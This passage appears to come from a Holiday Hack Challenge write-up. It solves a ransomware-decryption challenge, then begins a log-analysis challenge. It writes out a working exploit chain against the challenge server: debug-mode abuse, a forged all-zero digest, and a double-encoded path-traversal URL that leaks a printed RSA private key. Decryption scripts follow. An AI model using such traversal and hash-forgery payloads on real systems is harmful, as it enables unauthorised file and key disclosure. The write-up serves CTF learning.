network traffic, and malware samples. It's great for incident response - using tools like strings to find secrets in memory, decrypt network traffic, and run strace to see what malware does or executes.</p>"},{"location":"act_3/decrypt/#solution","title":"Solution","text":"<p>Warning</p> <p>This challenge only has a gold achievement.</p> <p>The terminal gives us an archive with artifacts to work on:</p> <ul> <li><code>DoNotAlterOrDeleteMe.frostbit.json</code>: ransomware output parameters.</li> <li><code>frostbit.elf</code>: ransomware sample.</li> <li><code>frostbit_core_dump.13</code>: memory sample of ransomware.</li> <li><code>naughty_nice_list.csv.frostbit</code>: encrypted file with answer.</li> <li><code>ransomware_traffic.pcap</code>: captured network traffic related to the ransomware sample.</li> </ul> <p>This challenge can be tackled in multiple ways. This write-up will show one of the ways to get to the answer. Other write-ups will use different paths.</p>"},{"location":"act_3/decrypt/#tls-decryption","title":"TLS decryption","text":"<p>The hints tell us that we can remove the TLS encryption from the .pcap. We run <code>strings</code> on the core dump to collect some information present in memory. We see the following interesting artifacts:</p> <pre><code>CLIENT_HANDSHAKE_TRAFFIC_SECRET 9919885c587a58f12ffe768f5dfd6bd9c147c0322ee22895f0c7cbb97ededc38 574f309921e0bb43ace02712056fee4066d6c2b01a07ad08d0668de6d8867ffd\nSERVER_HANDSHAKE_TRAFFIC_SECRET 9919885c587a58f12ffe768f5dfd6bd9c147c0322ee22895f0c7cbb97ededc38 6c678fe326e01c68fdeefab5c5674faa93d07d1651a826b73354c7df68f3e9f1\nCLIENT_TRAFFIC_SECRET_0 9919885c587a58f12ffe768f5dfd6bd9c147c0322ee22895f0c7cbb97ededc38 fc6b72245861535008917548cde2a08e39d17cacd7371b7ed7a44ed86cc11330\nSERVER_TRAFFIC_SECRET_0 9919885c587a58f12ffe768f5dfd6bd9c147c0322ee22895f0c7cbb97ededc38 054a1cda91cf3e370eef0f8a79f908d189fc07b636453307a6b37396ee421987\n\nPOST /api/v1/bot/cf9b1b33-b17b-433b-a473-2d8c5f06c1a5/key HTTP/1.1\nHost: api.frostbit.app\nUser-Agent: Go-http-client/1.1\nContent-Length: 1070\nContent-Type: application/json\nAccept-Encoding: gzip\n{\"encryptedkey\":\"5def927437b3dd61274753c3ac02ff27a048449880de0ea43363e9da22c771d19826ef6da645abbe4f1dff6abbaefb483cf0f4a58bb714483a02ee8795560a75b856f352112b6865a708cf082323998ed2bc9b55e654872a6f4c5fb4bc210ae3ccb4b4e92626cc8558be45d7bc1513fdd3632e65ad78dd04e8857fe799bfd2fe58207568e757b307f0715667276ab717a52b3a990029c4ce359e1ae805a0703005be7e4bcaf4b07ffb01271f960e56c0a6eb492aa340e02b0ef7860e85ed672ddccb36ee60b7d78a485e81e3ac6601587315d11647ca3d5a6fd5010b2476020d451edcb94d554a1c9a693f532dac1e304ad41ccdee151a70cdda2a6292021292395b1662371636e71a20931479ba511893b30a17de1a3bc3c63320b7ee44527ee980a525e7abe88f01a5eac6f2c4bdbdd74000b7dc872633662cc888efae1d0a050498b610f2ce85b17f474746f70861e6b9f204873323f4a0bc33f68552048a24ae2c3c118db2853a56ba1219da584b94fd68296dab87c3538adb1ec75396fdd466d1937dc5ef1f7cd838e880ec1d5733f6c6616eaba9f32493a670e56d2c9579a357b067a6de19e857b79dcdad2810e07d05aef065a0043fcd3e81701ffa9d1a8bb2ec7c5ae429e111f4950cc0ba1bad55cbc355a10e531f75584d13640c0f0b75cc0313b576b78f332d538d7efbf6daca0d0aad36d26f3726de3786a141fe\",\"nonce\":\"\"}\n</code></pre> <p>Without any decryption, we already see some network traffic. Still, let's make sure we have the complete picture. We have some secrets we can use to decrypt the TLS traffic. We create an <code>ssl.log</code> file and paste in the first four lines of the strings. We then open Wireshark, go to Edit -&gt; Preferences -&gt; Protocols -&gt; TLS -&gt; (Pre)-Master-Secret log filename -&gt; select our <code>ssl.log</code> file -&gt; Apply. We can now open the .pcap file and read the full TLS stream:</p> Decrypted TLS stream<pre><code>GET /api/v1/bot/40cc386b-b607-4f0c-8cac-e45483b68a70/session HTTP/1.1\nHost: api.frostbit.app\nUser-Agent: Go-http-client/1.1\nAccept-Encoding: gzip\n\nHTTP/1.1 200 OK\nServer: nginx/1.27.1\nDate: Fri, 03 Jan 2025 19:01:53 GMT\nContent-Type: application/json\nContent-Length: 29\nConnection: keep-alive\nStrict-Transport-Security: max-age=31536000\n\n{\"nonce\":\"18965f8a3073c813\"}\n\nPOST /api/v1/bot/40cc386b-b607-4f0c-8cac-e45483b68a70/key HTTP/1.1\nHost: api.frostbit.app\nUser-Agent: Go-http-client/1.1\nContent-Length: 1070\nContent-Type: application/json\nAccept-Encoding: gzip\n\n{\"encryptedkey\":\"3a7605fa7462e65a1e65819347cf729d845e46ace4c1883019049dba5deda3695e533b0890d89aad9b48e6f64cc4e74ed1053c70875b9950111ccd7813507488b3730c9030f40910525df4a33ece919e0cc3e44a8977bcbcbb19786c3fdf8cffdbbbab88338c8adb0487d6a21d1b2dda68f652e55ac799da8077204441d68dae414a6274c0d86e9213264a751361ac18f3b63eb9bf93a7e69d86a7cf19586861c470974a5f78dd295f8271d2ba17ad8b7ce8f36bf46b1296dc18dc422fd86c6aa21945ee820ec97e4059552a3542777570100b1e01cca31f1acd9e649e43f779630833f208c4bde0996df8fb5d94263e9a0716bca046b972b3abdb28e65c33a2a0cb99e99ab84f3df9e7ef2fc2fcd3e5f3387dfa7e25fcc7b35a7fd541597c8984aa8cde5315612b569ce6f5e21d2b7300fb4836f5bfcb402a9e162678c3af56780728db6555be8c2bad44614531ed22071aa0447144a407b717998aaf886100c925546370de54840d4d4db6e10d098ec20c8ae3bc218bcb80f868953073e58f1b5d29acf783b2b51a0d5380cc4d6e40bb5f0c6305be20429fe07b52b80f89cf079a3353f908e6dfcf84e666f0c7ed1424dab1ac55e52d0d7f18e2b59785a3f89b6c780dec39145603b681bae44ead0be3a048e7364b7d5448708cb00d022090143956accaa94bb6c5a8d08bbc3984a2d4205e116ef8418d3ab4ad29d059ae87\",\"nonce\":\"18965f8a3073c813\"}\n\nHTTP/1.1 200 OK\nServer: nginx/1.27.1\nDate: Fri, 03 Jan 2025 19:01:53 GMT\nContent-Type: application/json\nContent-Length: 97\nConnection: keep-alive\nStrict-Transport-Security: max-age=31536000\n\n{\"digest\":\"008200a104079150409910a22b499400\",\"status\":\"Key Set\",\"statusid\":\"LdqdRKkhK8UX22x9ok\"}\n</code></pre> <p>From this we understand the following:</p> <ul> <li>This info was already available to us in the strings and .json file.</li> <li>We have an key that is encrypted with PKI as shared in the hints.</li> <li>We have a nonce, digest (hash), and status ID.</li> </ul>"},{"location":"act_3/decrypt/#network-infrastructure","title":"Network infrastructure","text":"<p>In the strings we also find some URLs to the Frostbit app we have seen before in Santa Vision. The hints also indicate that we must think about the MQTT feeds from that challenge, which contained a deactivation URL (see Deactivate for more information) and a reference to a certificate key. This key is likely the PKI infrastructure the hints refer to and needed for decryption. We list our known URLs from these sources and their likely purpose.</p> <pre><code># Ransomware status page (GET)\nhttps://api.frostbit.app/view/LdqdRKkhK8UX22x9ok/40cc386b-b607-4f0c-8cac-e45483b68a70/status?digest=008200a104079150409910a22b499400\n# Get nonce (GET)\nhttps://api.frostbit.app/api/v1/bot/40cc386b-b607-4f0c-8cac-e45483b68a70/session\n# Set key (POST)\nhttps://api.frostbit.app/api/v1/bot/40cc386b-b607-4f0c-8cac-e45483b68a70/key\n# Deactivate (POST)\nhttps://api.frostbit.app/api/v1/frostbitadmin/bot/40cc386b-b607-4f0c-8cac-e45483b68a70/deactivate\n# MQTT message pointing at a key, likely the PKI key needed for decryption.\nLet's Encrypt cert for api.frostbit.app verified. at path /etc/nginx/certs/api.frostbit.app.key\n</code></pre> <p>The ransomware status page gives us a timer and is meant to show the decryption key when payment has been made.</p> <p></p> <p>Frostbit 2.0 ransomware status page.</p>"},{"location":"act_3/decrypt/#exploiting-debug-mode","title":"Exploiting debug mode","text":"<p>The hints indicate that there is a dev mode that is still turned on. In the status page source code we see some references to debug mode:</p> Some debug mode references<pre><code>&lt;!-- Placeholder for Debug Data --&gt;\n&lt;div id=\"debug\" style=\"margin-top: 20px;\"&gt;&lt;/div&gt;\n</code></pre> <p>We add a parameter to the URL:</p> <p><code>https://api.frostbit.app/view/j7hYYCSYXMPC3hrVDg/40cc386b-b607-4f0c-8cac-e45483b68a70/status?digest=80906082868080ac828124b88c20044d&amp;debug=1</code></p> <p>On the bottom of the page we now see the following which unfortunately doesn't help us much, but it confirms that the debug mode is working:</p> <p><code>{\"uuid\": \"40cc386b-b607-4f0c-8cac-e45483b68a70\", \"nonce\": \"REDACTED\", \"encryptedkey\": \"REDACTED\", \"deactivated\": false,  \"etime\": 1766534400}</code></p> <p>We fiddle some more with the URL to see if we can trigger any errors. When we remove a character from the digest, we get the following error:</p> <pre><code>{\n  \"debug\": true,\n  \"error\": \"Status Id File Digest Validation Error: Traceback (most recent call last):\\n  File \\\"/app/frostbit/ransomware/static/FrostBiteHashlib.py\\\", line 55, in validate\\n    decoded_bytes = binascii.unhexlify(hex_string)\\nbinascii.Error: Odd-length string\\n\"\n}\n</code></pre> <p>This reveals the location of the crypto library mentioned in the hints. We can view it at <code>https://api.frostbit.app/static/FrostBiteHashlib.py</code>.</p> Crypto library FrostBiteHashlib.py<pre><code>import traceback\nimport binascii\n\nclass Frostbyte128:\n    def __init__(self, file_bytes: bytes, filename_bytes: bytes, nonce_bytes: bytes, hash_length: int = 16):\n        self.file_bytes = file_bytes\n        self.filename_bytes = filename_bytes\n        self.filename_bytes_length = len(self.filename_bytes)\n        self.nonce_bytes = nonce_bytes\n        self.nonce_bytes_length = len(self.nonce_bytes)\n        self.hash_length = hash_length\n        self.hash_result = self._compute_hash()\n\n    def _compute_hash(self) -&gt; bytes:\n        hash_result = bytearray(self.hash_length)\n        count = 0\n\n        for i in range(len(self.file_bytes)):\n            xrd = self.file_bytes[i] ^ self.nonce_bytes[i % self.nonce_bytes_length]\n            hash_result[count % self.hash_length] = hash_result[count % self.hash_length] ^ xrd\n            count += 1\n\n        for i in range(len(self.filename_bytes)):\n            count_mod = count % self.hash_length\n            count_filename_mod = count % self.filename_bytes_length\n            count_nonce_mod = count % self.nonce_bytes_length\n            xrd = self.filename_bytes[count_filename_mod] ^ self.nonce_bytes[count_nonce_mod]\n            hash_result[count_mod] = hash_result[count_mod] &amp; xrd\n            count += 1\n\n        return bytes(hash_result)\n\n    def digest(self) -&gt; bytes:\n        \"\"\"Returns the raw binary hash result.\"\"\"\n        return self.hash_result\n\n    def hexdigest(self) -&gt; str:\n        \"\"\"Returns the hash result as a hexadecimal string.\"\"\"\n        return binascii.hexlify(self.hash_result).decode()\n\n    def update(self, file_bytes: bytes = None, filename_bytes: bytes = None, nonce_bytes: bytes = None):\n        \"\"\"Updates the internal state with new bytes and recomputes the hash.\"\"\"\n        if file_bytes is not None:\n            self.file_bytes = file_bytes\n        if filename_bytes is not None:\n            self.filename_bytes = filename_bytes\n        if nonce_bytes is not None:\n            self.nonce_bytes = nonce_bytes\n\n        self.hash_result = self._compute_hash()\n\n    def validate(self, hex_string: str):\n        \"\"\"Validates if the provided hex string matches the computed hash.\"\"\"\n        try:\n            decoded_bytes = binascii.unhexlify(hex_string)\n            if decoded_bytes == self.digest():\n                return True, None\n        except Exception as e:\n            stack_trace = traceback.format_exc()\n            return False, f\"{stack_trace}\"\n        return False, None\n</code></pre> AI usage <p>ChatGPT was used to analyze the code and look for possible vulnerabilities as suggested by the hints.</p> <p>We learn that the digest is computed based on the file, filename, and nonce bytes. We know the nonce. We do not have control over the file bytes, but can modify the filename in the URL.</p> <p>This is sufficient for us because the hashing function is vulnerable. The highlighted line 28 in the code conducts an AND operation which are not as safe regarding entropy as XOR operations. This gives us the possibility to control what the digest will be, which we can exploit.</p>"},{"location":"act_3/decrypt/#exploitation","title":"Exploitation","text":"<p>The hints indicate that we must trick the reverse proxy somehow. This sounds like path traversal and encoding trickery. We start playing around with <code>statusid</code> in the URL and find the following error with a specific URL where we apply local file injection for our key file:</p> <pre><code>https://api.frostbit.app/view/..%252f..%252f..%252f..%252fetc%252fnginx%252fcerts%252fapi.frostbit.app.key/40cc386b-b607-4f0c-8cac-e45483b68a70/status?digest=80906082868080ac828124b88c20044d&amp;debug=true\n\n{\n  \"debug\": true,\n  \"error\": \"Invalid Status Id or Digest\"\n}\n</code></pre> <p>This means we are now supplying the key file to the crypto library. If we get the digest aligned, the ransomware status page will display the key.</p> <p>Looking at the truth tables for AND and XOR, we can see that the AND operator gives us the opportunity to always compute a bit as a zero, no matter the input.</p> AND Truth Table A B Y 0 0 0 0 1 0 1 0 0 1 1 1 XOR Truth Table A B Y 0 0 0 0 1 1 1 0 1 1 1 0 <p>These two lines in the crypto library are critical:</p> <pre><code>xrd = self.filename_bytes[count_filename_mod] ^ self.nonce_bytes[count_nonce_mod]\nhash_result[count_mod] = hash_result[count_mod] &amp; xrd\n</code></pre> <p>Since we know the nonce, we can include it in the filename we supply and use it to let our <code>xrd</code> parameter become all zeroes because of the XOR operator. It will then be used to compute the final digest value, and we'll then know it will be all zeroes as well because of the nature of the AND operator.</p> AI usage <p>ChatGPT was used to generate a Python script using the crypto library to experiment with how the digest changes based on the filename input, the nonce, and randomly generated bytes.</p> <p>Our nonce is <code>18965f8a3073c813</code> and represented in hexadecimal. Using CyberChef we can convert it to an UTF-8 value: <code>\u0018\u0096_\u008a0s\u00c8\u0013</code> (might not be showed correctly on this webpage). With our helper script we can figure out how to make our digest all zeroes. We find the following URL where we move to the root using path traversal, move into a non-existent folder based on our nonce values, move back to root, and move to our keyfile, with a digest consisting only of zeroes:</p> <p><code>https://api.frostbit.app/view/..%252f..%252f..%252f..%252f%18%C2%96_%C2%8A0s%C3%88%13%18%C2%96_%C2%8A0s%C3%88%13%18%C2%96_%C2%8A0s%C3%88%13%18%C2%96_%C2%8A0s%C3%88%13%18%C2%96_%C2%8A0s%C3%88%13%18%C2%96_%C2%8A0s%C3%88%13%18%C2%96_%C2%8A0s%C3%88%13%252f..%252fetc%252fnginx%252fcerts%252fapi.frostbit.app.key/40cc386b-b607-4f0c-8cac-e45483b68a70/status?digest=00000000000000000000000000000000&amp;debug=true</code></p>"},{"location":"act_3/decrypt/#decrypting-the-naughty-nice-list","title":"Decrypting the naughty-nice list","text":"<p>The URL gives us the ransomware status page with the key file.</p> Key file Frostbit key<pre><code>    -----BEGIN RSA PRIVATE KEY-----\n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\n-----END RSA PRIVATE KEY-----\n</code></pre> <p>We save this key to <code>rsa.pem</code>. In the strings of the memory dump we find the following reference to the used cipher:</p> <pre><code>*x509.pkcs1PublicKey\n</code></pre> <p>We generate a script to decrypt our key found in the network traffic.</p> AI usage <p>ChatGPT was used to generate a decryption script as we didn't get it to work using CyberChef.</p> RSA decryption script Decryption script<pre><code>from Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_v1_5\nfrom Crypto.Util.Padding import unpad\nimport binascii\n\nwith open('rsa.pem', 'rb') as f:\n    rsa_key = RSA.import_key(f.read())\n\nencrypted_aes_key_hex = \"3a7605fa7462e65a1e65819347cf729d845e46ace4c1883019049dba5deda3695e533b0890d89aad9b48e6f64cc4e74ed1053c70875b9950111ccd7813507488b3730c9030f40910525df4a33ece919e0cc3e44a8977bcbcbb19786c3fdf8cffdbbbab88338c8adb0487d6a21d1b2dda68f652e55ac799da8077204441d68dae414a6274c0d86e9213264a751361ac18f3b63eb9bf93a7e69d86a7cf19586861c470974a5f78dd295f8271d2ba17ad8b7ce8f36bf46b1296dc18dc422fd86c6aa21945ee820ec97e4059552a3542777570100b1e01cca31f1acd9e649e43f779630833f208c4bde0996df8fb5d94263e9a0716bca046b972b3abdb28e65c33a2a0cb99e99ab84f3df9e7ef2fc2fcd3e5f3387dfa7e25fcc7b35a7fd541597c8984aa8cde5315612b569ce6f5e21d2b7300fb4836f5bfcb402a9e162678c3af56780728db6555be8c2bad44614531ed22071aa0447144a407b717998aaf886100c925546370de54840d4d4db6e10d098ec20c8ae3bc218bcb80f868953073e58f1b5d29acf783b2b51a0d5380cc4d6e40bb5f0c6305be20429fe07b52b80f89cf079a3353f908e6dfcf84e666f0c7ed1424dab1ac55e52d0d7f18e2b59785a3f89b6c780dec39145603b681bae44ead0be3a048e7364b7d5448708cb00d022090143956accaa94bb6c5a8d08bbc3984a2d4205e116ef8418d3ab4ad29d059ae87\"\n\nencrypted_aes_key = binascii.unhexlify(encrypted_aes_key_hex)\n\ncipher = PKCS1_v1_5.new(rsa_key)\ndecrypted_aes_key = cipher.decrypt(encrypted_aes_key, None)\n\nprint(f\"Decrypted AES key: {binascii.hexlify(decrypted_aes_key).decode()}\")\n</code></pre> <p>The script gives us this:</p> <p><code>Decrypted AES key: 36323364393033653337613364626164353430346366626337373637663562352c31383936356638613330373363383133</code></p> <p>We have to convert it from hex using CyberChef:</p> <p><code>623d903e37a3dbad5404cfbc7767f5b5,18965f8a3073c813</code></p> <p>We can now finally decrypt the encrypted .csv file.</p> AI usage <p>ChatGPT was used to generate a decryption script as we didn't get it to work using CyberChef.</p> AES decryption script Decryption script<pre><code>from Crypto.Cipher import AES\nfrom Crypto.Util.Padding import unpad\n\ndef decrypt_file(encrypted_file, decrypted_file, key, iv):\n    with open(encrypted_file, 'rb') as f:\n        encrypted_data = f.read()\n\n    # Initialize AES in CBC mode\n    cipher = AES.new(key, AES.MODE_CBC, iv)\n    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)\n\n    with open(decrypted_file, 'wb') as f:\n        f.write(decrypted_data)\n    print(\"File decrypted successfully.\")\n\n# Inputs\nkey = b'623d903e37a3dbad5404cfbc7767f5b5'  # Replace with your 16/24/32-byte key\niv = b'18965f8a3073c813'        # Replace with your 16-byte IV\nencrypted_file = 'naughty_nice_list.csv.frostbit'\ndecrypted_file = 'decrypted_file.csv'\n\ndecrypt_file(encrypted_file, decrypted_file, key, iv)\n</code></pre> <p>Answer</p> <p>We can read the naughty-nice list and find this child at number 440: <code>Xena Xtreme</code>.</p>"},{"location":"act_3/decrypt/#response","title":"Response","text":"Tangle Coalbox <p>Well, I\u2019ll be a reindeer\u2019s uncle! You've done it, Gumshoe! You cracked that frosty code and saved the Naughty-Nice List just in the nick of time. The elves\u2019ll be singin\u2019 your praises from here to the South Pole!</p> <p>I knew you had it in ya. Now, let\u2019s get these toys delivered and make this a holiday to remember. You're a true North Pole hero!</p>"},{"location":"act_3/elf_stack/","title":"Elf Stack","text":"<p>Difficulty: </p>"},{"location":"act_3/elf_stack/#objective","title":"Objective","text":"<p>Task description</p> <p>Help the ElfSOC analysts track down a malicious attack against the North Pole domain.</p> Fitzy Shortstack <p>Greetings! I'm the genius behind the North Pole Elf Stack SIEM. And oh boy, we\u2019ve got a situation on our hands.</p> <p>Our system was attacked\u2014Wombley\u2019s faction unleashed their FrostBit ransomware, and it\u2019s caused a digital disaster.</p> <p>The logs are a mess, and Wombley\u2019s laptop\u2014the only backup of the Naughty-Nice List\u2014was smashed to pieces.</p> <p>Now, it\u2019s all up to you to help me trace the attack vectors and events. We need to figure out how this went down before it\u2019s too late.</p> <p>You\u2019ll be using a containerized ELK stack or Linux CLI tools. Sounds like a fun little puzzle, doesn't it?</p> <p>Your job is to analyze these logs... think of it as tracking snow tracks but in a digital blizzard.</p> <p>If you can find the attack path, maybe we can salvage what\u2019s left and get Santa\u2019s approval.</p> <p>Santa\u2019s furious at the faction fighting, and he\u2019s disappointed. We have to make things right.</p> <p>So, let\u2019s show these attackers that the North Pole\u2019s defenses are no joke!</p>"},{"location":"act_3/elf_stack/#hints","title":"Hints","text":"Elf Stack Intro <p>I'm part of the ElfSOC that protects the interests here at the North Pole. We built the Elf Stack SIEM, but not everybody uses it. Some of our senior analysts choose to use their command line skills, while others choose to deploy their own solution. Any way is possible to hunt through our logs!</p> Elf Stack WinEvent <p>One of our seasoned ElfSOC analysts told me about a great resource to have handy when hunting through event log data. I have it around here somewhere, or maybe it was online. Hmm.</p> Elf Stack Powershell <p>Our Elf Stack SIEM has some minor issues when parsing log data that we still need to figure out. Our ElfSOC SIEM engineers drank many cups of hot chocolate figuring out the right parsing logic. The engineers wanted to ensure that our junior analysts had a solid platform to hunt through log data.</p> Elf Stack Fields <p>If you are using your command line skills to solve the challenge, you might need to review the configuration files from the containerized Elf Stack SIEM.</p> Elf Stack Hard - Email1 <p>I was on my way to grab a cup of hot chocolate the other day when I overheard the reindeer talking about playing games. The reindeer mentioned trying to invite Wombley and Alabaster to their games. This may or may not be great news. All I know is, the reindeer better create formal invitations to send to both Wombley and Alabaster.</p> Elf Stack Hard - Email2 <p>Some elves have tried to make tweaks to the Elf Stack log parsing logic, but only a seasoned SIEM engineer or analyst may find that task useful.</p>"},{"location":"act_3/elf_stack/#solution","title":"Solution","text":"<p>As I followed the Linux forensics course FOR577 earlier this year, I decided to tackle this challenge using the command line only. We download and extract the two log files into a single folder. We filter them to have a single log file for every type of log.</p> Check the log types of log_chunk_1 and log_chunk_2<pre><code>cat *.log | cut -d \" \" -f 4 | sort | uniq\n\nAuthLog\nGreenCoat\nNetflowPmacct\nSnowGlowMailPxy\nWindowsEvent\n</code></pre> Create separate log files per log type<pre><code>cat *.log | grep \"AuthLog\" &gt; auth.log\ncat *.log | grep \"GreenCoat\" &gt; greencoat.log\ncat *.log | grep \"NetflowPmacct\" &gt; netflow.log\ncat *.log | grep \"SnowGlowMailPxy\" &gt; email.log\ncat *.log | grep \"WindowsEvent\" &gt; windows.log\n</code></pre> <p>We are then ready to tackle the questions.</p> SilverGold Solution to question 1 <p>Question</p> <p>How many unique values are there for the event_source field in all logs?</p> <pre><code>cat *.log | cut -d \" \" -f 4 | sort | uniq | wc -l\n\n5\n</code></pre> <p>Answer: <code>5</code></p> Solution to question 2 <p>Question</p> <p>Which event_source has the fewest number of events related to it?</p> <pre><code>wc -l *.log\n\n269 auth.log\n7476 greencoat.log\n1398 mail.log\n34679 netflow.log\n2299324 windows.log\n2343146 total\n</code></pre> <p>Answer: <code>Authlog</code></p> Solution to question 3 <p>Question</p> <p>Using the event_source from the previous question as a filter, what is the field name that contains the name of the system the log event originated from?</p> <pre><code>cat auth.log | head\n\n&lt;134&gt;1 2024-09-15T00:10:01-04:00 kringleSSleigH AuthLog - - - {\"timestamp\": \"2024-09-15T03:10:01.304953-04:00\", \"hostname\": \"kringleSSleigH\", \"service\": \"CRON[4863]:\", \"message\": \"pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)\"}\n</code></pre> <p>Answer: <code>hostname</code></p> Solution to question 4 <p>Question</p> <p>Which event_source has the second highest number of events related to it?</p> <pre><code>wc -l *.log\n\n269 auth.log\n7476 greencoat.log\n1398 mail.log\n34679 netflow.log\n2299324 windows.log\n2343146 total\n</code></pre> <p>Answer: <code>NetflowPmacct</code></p> Solution to question 5 <p>Question</p> <p>Using the event_source from the previous question as a filter, what is the name of the field that defines the destination port of the Netflow logs?</p> <pre><code>cat netflow1.log | head -n1\n\n&lt;134&gt;1 2024-09-15T10:37:43-04:00 kringleconnect NetflowPmacct - - - {\"event_type\": \"purge\", \"ip_src\": \"172.24.25.93\", \"ip_dst\": \"172.24.25.25\", \"port_src\": 29994, \"port_dst\": 808, \"ip_proto\": \"tcp\", \"timestamp_start\": \"2024-09-15T10:37:43-04:00\", \"timestamp_end\": \"0000-00-00T00:00:00-00:00\", \"packets\": 1, \"bytes\": 40, \"src_host\": \"SnowSentry.northpole.local\", \"dst_host\": \"\"}\n</code></pre> <p>Answer: <code>port_dst</code></p> Solution to question 6 <p>Question</p> <p>Which event_source is related to email traffic?</p> <p>Answer: <code>SnowGlowMailPxy</code></p> Solution to question 7 <p>Question</p> <p>Looking at the event source from the last question, what is the name of the field that contains the actual 